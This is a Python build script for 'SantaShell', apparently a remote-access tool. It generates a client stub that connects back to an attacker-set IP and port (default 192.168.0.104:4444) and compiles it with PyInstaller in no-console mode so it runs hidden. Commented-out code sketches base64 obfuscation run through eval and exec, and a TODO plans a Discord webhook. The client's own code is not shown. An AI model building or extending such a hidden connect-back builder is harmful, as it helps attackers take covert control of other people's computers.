# this builds the client's app

import argparse
import subprocess
import os

# python build.py -w -a "192.168.0.104" -p 4444 -f my_app

WINDOWS_PYTHON_INTERPRETER_PATH = os.path.expanduser(r"C:\Users\Chris\AppData\Local\Programs\Python\Python310\Scripts\pyinstaller.exe")

def get_arguments():
    parser = argparse.ArgumentParser(description='[SantaShell]')
    parser._optionals.title = "Optional Arguments"
    parser.add_argument("-w", "--windows", dest="windows", help="Compile on windows", action='store_true')
    parser.add_argument("-a", "--address", dest="address", help="IP address", default='192.168.0.104')

    # TODO: add -w --webhook for discord webhook; -arch --architecture

    required_arguments = parser.add_argument_group('Required Arguments')
    required_arguments.add_argument("-p", "--port", dest="port", help="Port for the connection", default=4444)
    required_arguments.add_argument("-f", "--file", dest="filename", help="File name.", required=True)
    return parser.parse_args()

def create_file(file_name, address, port):
    # global # the name of the encrypted file
    with open(file_name, "w+") as file:
        #
        #file.write("from base64 import b64decode, b64encode\n")
        #
        #file.write("src = '''\n")  # source code
        #
        file.write("from main_app import Client\n")
        address = f'"{address}"'
        file.write("c = Client(" + address + ", " + str(port) + ")\n")
        #
        #file.write("'''\n")
        #
        #file.write("def hid3(src):\n")
        #
        #file.write("\treturn b64encode(src.encode())\n")
        #
        #file.write("src_ = hid3(src)")

        # src_ should be saved in another file
        # then:
        # encrypted python file:

        # src_ = b'HJshbSKasuhsAUISHansASJas;i'  # for example
        #eval(compile(show(src_), '<string>', 'exec'))
        file.close()




def compile_on_windows(file_name):
    subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name])  # TODO: compile the file that is encrypted !!!

arguments = get_arguments()
create_file(arguments.filename, arguments.address, arguments.port)

if arguments.windows:
    compile_on_windows(arguments.filename)
